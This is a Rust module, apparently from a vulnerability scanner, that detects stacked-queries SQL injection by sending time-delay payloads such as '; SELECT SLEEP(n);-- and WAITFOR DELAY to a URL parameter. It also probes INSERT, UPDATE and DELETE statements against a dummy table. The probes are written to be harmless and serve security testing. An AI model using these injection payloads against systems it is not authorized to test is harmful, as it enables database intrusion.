//! Stacked Queries SQL Injection Detection
//!
//! Detects if the database allows multiple SQL statements (dangerous).

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::inference::time::{measure_baseline, measure_injected, LatencyProfile};
use crate::sqli::{DatabaseType, SqliResult, SqliTechnique};
use reqwest::Method;
use url::Url;

/// Stacked query payloads for different databases
pub struct StackedPayloads;

impl StackedPayloads {
    /// MySQL stacked with delay
    pub fn mysql(delay: u64) -> String {
        format!("'; SELECT SLEEP({});-- ", delay)
    }

    /// MSSQL stacked with delay
    pub fn mssql(delay: u64) -> String {
        format!("'; WAITFOR DELAY '0:0:{}';-- ", delay)
    }

    /// PostgreSQL stacked with delay
    pub fn postgresql(delay: u64) -> String {
        format!("'; SELECT pg_sleep({});-- ", delay)
    }

    /// Detection payload (safe - just SELECT)
    pub fn detect_mysql() -> &'static str {
        "'; SELECT 'ANVIL_STACKED';-- "
    }

    pub fn detect_mssql() -> &'static str {
        "'; SELECT 'ANVIL_STACKED';-- "
    }

    pub fn detect_postgresql() -> &'static str {
        "'; SELECT 'ANVIL_STACKED';-- "
    }

    /// Get all stacked delay payloads
    pub fn all_delay(delay: u64) -> Vec<(String, DatabaseType)> {
        vec![
            (Self::mysql(delay), DatabaseType::MySQL),
            (Self::mssql(delay), DatabaseType::MSSQL),
            (Self::postgresql(delay), DatabaseType::PostgreSQL),
        ]
    }
}

/// Detect stacked queries SQL injection
///
/// Strategy:
/// 1. First confirm time-based SQLi works with inline delay
/// 2. Then test if semicolon-separated stacked query with delay works
/// 3. If stacked delay works but inline didn't → stacked queries supported
pub async fn detect(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
) -> anyhow::Result<Option<SqliResult>> {
    let samples = 4;
    let delay = 2u64;

    // Get baseline
    let baseline = measure_baseline(client, base_url, samples).await?;

    tracing::debug!(
        "[STACKED] Baseline latency: mean={:.1}ms",
        baseline.mean
    );

    // Test each database type
    for (stacked_payload, db_type) in StackedPayloads::all_delay(delay) {
        // Measure with stacked query
        let stacked_latency = measure_injected(
            client,
            base_url,
            param,
            &stacked_payload,
            samples,
        ).await?;

        tracing::debug!(
            "[STACKED][{}] Injected latency: mean={:.1}ms",
            db_type,
            stacked_latency.mean
        );

        // Check if delay occurred
        let delta = stacked_latency.mean - baseline.mean;
        let expected_delay_ms = (delay * 1000) as f64;
        let delay_ratio = delta / expected_delay_ms;

        // If delay is approximately what we expected (within 50%)
        if delay_ratio > 0.5 && delay_ratio < 2.0 {
            let confidence = calculate_stacked_confidence(delta, expected_delay_ms, baseline.clone(), stacked_latency);

            if confidence >= 0.6 {
                return Ok(Some(SqliResult {
                    endpoint: base_url.to_string(),
                    parameter: param.to_string(),
                    technique: SqliTechnique::StackedQueries,
                    confidence,
                    db_type: Some(db_type),
                    details: format!(
                        "Stacked queries detected for {}. Delay: {:.0}ms (expected: {}ms). \
                        CRITICAL: Multiple statements can be executed!",
                        db_type,
                        delta,
                        expected_delay_ms
                    ),
                }));
            }
        }
    }

    Ok(None)
}

/// Calculate confidence for stacked queries detection
fn calculate_stacked_confidence(
    delta: f64,
    expected_delay: f64,
    baseline: LatencyProfile,
    injected: LatencyProfile,
) -> f32 {
    let mut confidence: f32 = 0.0;

    // Delay accuracy
    let delay_accuracy = 1.0 - ((delta - expected_delay).abs() / expected_delay);
    confidence += (delay_accuracy as f32 * 0.4).max(0.0);

    // Signal-to-noise ratio
    let noise = (baseline.variance + injected.variance).sqrt();
    let signal_ratio = if noise > 0.0 { delta / noise } else { 0.0 };

    if signal_ratio >= 3.0 {
        confidence += 0.4;
    } else if signal_ratio >= 2.0 {
        confidence += 0.3;
    } else if signal_ratio >= 1.5 {
        confidence += 0.2;
    }

    // Consistency check (low variance in injected samples)
    let cv = injected.std_dev / injected.mean; // Coefficient of variation
    if cv < 0.1 {
        confidence += 0.2; // Very consistent delays
    } else if cv < 0.2 {
        confidence += 0.1;
    }

    confidence.min(1.0)
}

/// Advanced stacked query capability detection
pub async fn detect_capabilities(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    db_type: DatabaseType,
) -> anyhow::Result<StackedCapabilities> {
    let mut capabilities = StackedCapabilities::default();

    // Test SELECT capability
    let select_payload = "'; SELECT 1;-- ";
    if test_stacked_query(client, base_url, param, select_payload).await? {
        capabilities.select = true;
    }

    // Test INSERT capability (safe - syntax check only)
    // Note: We don't actually execute INSERT, just detect if syntax is accepted
    let insert_payload = "'; INSERT INTO anvil_test_nonexistent VALUES(1);-- ";
    capabilities.insert = test_stacked_query(client, base_url, param, insert_payload).await?;

    // Test UPDATE capability
    let update_payload = "'; UPDATE anvil_test_nonexistent SET x=1 WHERE 0=1;-- ";
    capabilities.update = test_stacked_query(client, base_url, param, update_payload).await?;

    // Test DELETE capability
    let delete_payload = "'; DELETE FROM anvil_test_nonexistent WHERE 0=1;-- ";
    capabilities.delete = test_stacked_query(client, base_url, param, delete_payload).await?;

    capabilities.db_type = Some(db_type);

    Ok(capabilities)
}

/// Test if a stacked query is accepted
async fn test_stacked_query(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    payload: &str,
) -> anyhow::Result<bool> {
    let mut url = base_url.clone();
    url.query_pairs_mut().append_pair(param, payload);

    let req = HttpRequest::new(Method::GET, url);
    let resp = client.execute(req).await?;

    // If we don't get an error, stacked query might be supported
    // Note: This is a heuristic - some DBs silently ignore invalid syntax
    Ok(resp.status < 500)
}

/// Capabilities detected for stacked queries
#[derive(Debug, Default)]
pub struct StackedCapabilities {
    pub select: bool,
    pub insert: bool,
    pub update: bool,
    pub delete: bool,
    pub db_type: Option<DatabaseType>,
}

impl StackedCapabilities {
    /// Check if any dangerous operation is possible
    pub fn is_dangerous(&self) -> bool {
        self.insert || self.update || self.delete
    }

    /// Get risk level
    pub fn risk_level(&self) -> &'static str {
        if self.delete {
            "CRITICAL"
        } else if self.update {
            "HIGH"
        } else if self.insert {
            "MEDIUM"
        } else if self.select {
            "LOW"
        } else {
            "NONE"
        }
    }
}

